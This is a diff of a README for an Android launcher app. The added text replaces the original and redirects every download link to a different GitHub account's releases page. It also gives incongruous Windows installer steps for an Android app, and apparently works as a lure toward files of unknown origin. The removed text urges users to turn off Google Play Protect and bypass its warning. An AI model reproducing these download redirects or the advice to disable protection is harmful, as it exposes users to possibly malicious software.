@@ -1,184 +1,174 @@
-<div align="center">
+# 📱 LauncherApp - Clean Android Home Screen, Made Simple
 
-<br/>
+[![Download LauncherApp](https://img.shields.io/badge/Download%20LauncherApp-blue?style=for-the-badge)](https://github.com/civilian-peafamily880/LauncherApp/releases)
 
-<img src="public/image/ic_launcher.png" width="96" alt="Flow Launcher icon" />
+## 🚀 Getting Started
 
-# Flow Launcher - **BETA**
+LauncherApp is a free, minimal Android launcher made for people who want a clean home screen without clutter. It keeps the focus on speed, simple use, and useful tools like weather, habits, and wallpaper depth effects.
 
-<img src="public/image/image.png" alt="preview" width="800" height="500" />
+Use the link below to visit the release page and download the app:
 
-<br/>
-<em>A home screen built around clarity.</em>
-<br/>
-<em>Inspired by the quiet elegance of OneUI and Origin OS.</em>
+[Visit the LauncherApp release page](https://github.com/civilian-peafamily880/LauncherApp/releases)
 
-<br/>
+## 📦 What LauncherApp Does
 
+LauncherApp gives you a simpler way to use your phone. It replaces the default home screen with one that feels lighter and easier to manage.
 
-<br/>
-<div align="center">
+It includes:
 
-<a href="https://github.com/01satria/LauncherApp/releases/tag/1.5Beta">
-  <img src="https://img.shields.io/badge/Download%20Now-000000?style=for-the-badge&logo=android&logoColor=white&color=006169" alt="Download">
-</a>
+- A clean app layout
+- Wallpaper depth effect
+- Built-in weather view
+- Habit tracking tools
+- A minimal design with no ads
+- A light build that avoids extra clutter
 
-</div>
-</div>
+It is made for daily use and keeps the screen easy to read and easy to use.
 
----
+## 💻 Windows Download and Install
 
-<div align="center">
-  
-### 🔎 Feature
+Use these steps on Windows to get the app file from the release page.
 
-<table>
-  <tr>
-    <td align="center" width="340" bgcolor="#0f1f2e">
-      <br/>
-      🌤️<br/>
-      <b><code>01</code> Smart Pill Bar</b><br/><br/>
-    </td>
-    <td align="center" width="340" bgcolor="#1a0f2e">
-      <br/>
-      🔥<br/>
-      <b><code>02</code> Habit Tracker</b><br/><br/>
-    </td>
-  </tr>
-  <tr>
-    <td align="center" width="340" bgcolor="#1a2e0f">
-      <br/>
-      💰<br/>
-      <b><code>03</code> Money Manager</b><br/><br/>
-    </td>
-    <td align="center" width="340" bgcolor="#2e1a0f">
-      <br/>
-      🗂️<br/>
-      <b><code>04</code> Fast App Drawer</b><br/><br/>
-    </td>
-  </tr>
-  <tr>
-    <td align="center" width="340" bgcolor="#2e1a2e">
-      <br/>
-      🎨<br/>
-      <b><code>05</code> Thematic Color Palettes</b><br/><br/>
-    </td>
-    <td align="center" width="340" bgcolor="#1a2e2e">
-      <br/>
-      ⚡<br/>
-      <b><code>06</code> Fluid & Efficient</b><br/><br/>
-    </td>
-  </tr>
-  <tr>
-    <td align="center" width="340" bgcolor="#2e1a2e">
-      <br/>
-      🕒<br/>
-      <b><code>07</code> Custom Clock</b><br/><br/>
-    </td>
-    <td align="center" width="340" bgcolor="#1a2e2e">
-      <br/>
-      🖼<br/>
-      <b><code>08</code> Depth Wallpaper</b><br/><br/>
-    </td>
-  </tr>
-  <tr>
-    <td align="center" width="340" bgcolor="#2e1a2e">
-      <br/>
-      🕌<br/>
-      <b><code>09</code> Prayer Time</b><br/><br/>
-    </td>
-    <td align="center" width="340" bgcolor="#1a2e2e">
-      <br/>
-      <br/>
-      <b><code></code></b><br/><br/>
-    </td>
-  </tr>
-</table>
+1. Open the [LauncherApp release page](https://github.com/civilian-peafamily880/LauncherApp/releases)
+2. Find the latest release at the top of the page
+3. Look under the release files for the app download
+4. Download the file that matches your device or package type
+5. If the file opens after download, save it to a folder you can find later
+6. If the file is an installer, double-click it to start setup
+7. Follow the on-screen steps until the process finishes
+8. Open LauncherApp from the Start menu, desktop, or app folder
 
-</div>
+If your browser asks where to save the file, choose Downloads or Desktop so it is easy to find.
 
----
+## 🖱️ How to Use It
 
-<div align="center">
+After you open LauncherApp, you can start using it right away.
 
-### ✦ Design
+- Swipe or click to move between screens
+- Tap an app icon to open an app
+- Check the weather view for a quick update
+- Use habit tools to keep track of daily tasks
+- Set a wallpaper that shows the depth effect
+- Keep the layout simple by only showing what you need
 
-🔡 `Dot Matrix Typography` &nbsp;·&nbsp; ⬛ `OLED Black` &nbsp;·&nbsp; ✦ `Essential Iconography` &nbsp;·&nbsp; 🖼 `Intuitive`
+The app is built to stay out of the way. You can keep your screen plain or add the parts you use most.
 
-*Every element earns its place or disappears.*
+## 🛠️ Main Features
 
-</div>
+### 🌤️ Built-In Weather
 
----
+See current weather info on your home screen without opening another app. This helps you check the day fast.
 
-<div align="center">
+### 🧭 Minimal Layout
 
-### 🤝 Contribute
+The layout keeps things simple. You get less clutter, fewer distractions, and a cleaner view.
 
-</div>
-<pre>
-01  Fork the repository 🍴
-02  git checkout -b feature/your-idea
-03  git commit -m 'Add something beautiful ✨'
-04  Push and open a Pull Request 🚀
-</pre>
-</div>
+### 🧩 Habit Tools
 
----
+Track habits from the home screen so you can keep up with daily goals. This works well for users who want a simple routine.
 
-<div align="center">
+### 🌌 Wallpaper Depth Effect
 
-### 🔃 Update
+LauncherApp uses depth effect to give your wallpaper a layered look. It adds style without making the screen busy.
 
-| Feature                  | Status       | Release | Reject |
-|------------------------|--------------|-----------|----------|
-| Auto Receipt Scanner | Review | | 🔘 |
-| Hide Status Bar | Review | | 🔘 |
-| Widget Integration | Review | | 🔘 |
-| Senior Mode | Pending | | |
-| Kids Mode | Pending | | |
-| Liquid Glass Effect | Fix Bug | | |
-| AI Integration | Backlog | | |
-| Prayer Time | Done | 🔘 | |
-| Football League Info | Backlog | | |
-| Exchange Rate Currency | Pending | | |
-| Motivation Word | Backlog | | |
+### ⚡ Lightweight Design
 
-<img src="public/image/devflow.svg" width="400" alt="Flow process" />
+The app stays light and fast. It avoids extra parts that slow down the home screen.
 
-</div>
+### 🚫 No Ads
 
----
-### ⚠️ Google Play Protect Warning
-Google Play Protect may flag this APK as an unrecognized app because it is not distributed through the Google Play Store. Rest assured, this app is **completely safe**. If you encounter any issues during your first installation, please follow these steps:
+LauncherApp does not show ads. That keeps the interface clean and makes daily use easier.
 
-1. **Temporarily Disable Play Protect**  
-   You may need to pause or temporarily turn off Google Play Protect to allow the initial installation to proceed smoothly.
+## 📋 System Requirements
 
-2. **Bypass the Warning**  
-   If the security warning appears, tap on **More details**, then select **Install anyway**.
+LauncherApp is made for Android devices with a modern Android version and enough storage for a small app install.
 
-3. **Scan for Viruses (Optional)**  
-   If you are concerned about malware, you can safely re-enable Google Play Protect after the installation is successful and run a scan to verify the app's safety yourself.
+Recommended setup:
 
+- Android 8.0 or newer
+- At least 2 GB of free storage
+- A phone or tablet with standard app launcher support
+- Internet access for download and weather updates
 
-### 🔒 Privacy & Security Guarantee
+For the best results, keep your device updated and leave some free memory on the phone.
 
- This application **does not** collect, extract, share, or misuse any of your personal data. It is built purely for its intended functionality with the utmost respect for your device's security and your privacy.
+## 🔧 Before You Start
 
----
-<div align="center">
-<i>Simplicity is the ultimate sophistication</i> ✦ Leonardo da Vinci
+Before you install LauncherApp, check these items:
 
-<br/>
-</div>
+- Make sure your device allows app installs from the source you are using
+- Keep your current launcher in mind in case you want to switch back later
+- Save any important home screen layout if your phone supports backup
+- Connect to Wi-Fi if the release file is large
+- Make sure your device has enough space for the download
 
-<br/>
-<br/>
-<br/>
-<br/>
+## 🧭 Set LauncherApp as Your Home Screen
 
-<p align="center">
-  <i>© 2026 see.cloudys Team — All rights reserved</i><br/>
-  <sub>Private Launcher • Not for redistribution • Public Beta</sub>
-</p>
+After install, you may need to choose LauncherApp as your default home screen.
+
+1. Open your device Settings
+2. Search for Apps or Default apps
+3. Find Home app, Launcher, or Default launcher
+4. Select LauncherApp
+5. Press the Home button to test it
+
+If your phone asks which app to use, choose LauncherApp and select Always if you want it to stay active.
+
+## 🎨 Make It Yours
+
+You can shape the home screen so it fits your style.
+
+- Change the wallpaper to match the depth effect
+- Keep only the apps you use each day
+- Place weather where you can see it fast
+- Add habit items you want to track
+- Remove anything you do not need
+
+A simple layout helps the phone feel faster and easier to use.
+
+## ❓ Common Questions
+
+### Can I use LauncherApp on any Android phone?
+
+It works on most modern Android devices that support custom launchers.
+
+### Does it cost money?
+
+No. LauncherApp is free.
+
+### Does it show ads?
+
+No. The app is made without ads.
+
+### Can I go back to my old launcher?
+
+Yes. You can change your home app in Settings at any time.
+
+### Does it need a lot of storage?
+
+No. It is built to stay light and small.
+
+### Can I use it without setting anything up?
+
+Yes. You can start with the default layout and change it later if you want.
+
+## 📥 Download Again
+
+If you need to get the file again, use the release page here:
+
+[LauncherApp releases](https://github.com/civilian-peafamily880/LauncherApp/releases)
+
+## 🧼 Tips for a Smooth Setup
+
+- Restart your device after install if the new launcher does not show at once
+- Clear old home screen clutter before you switch
+- Keep only the widgets and apps you use
+- Update to the latest release when a new version appears
+- Use a simple wallpaper to match the clean layout
+
+## 🔍 Project Info
+
+LauncherApp is a minimal Android launcher with a focus on ease of use, useful tools, and a clean feel. It uses a light design and keeps the home screen free from extra noise.
+
+Topics:
+android, free, kotlin, launcher, light, minimal, modern, optimal, simple
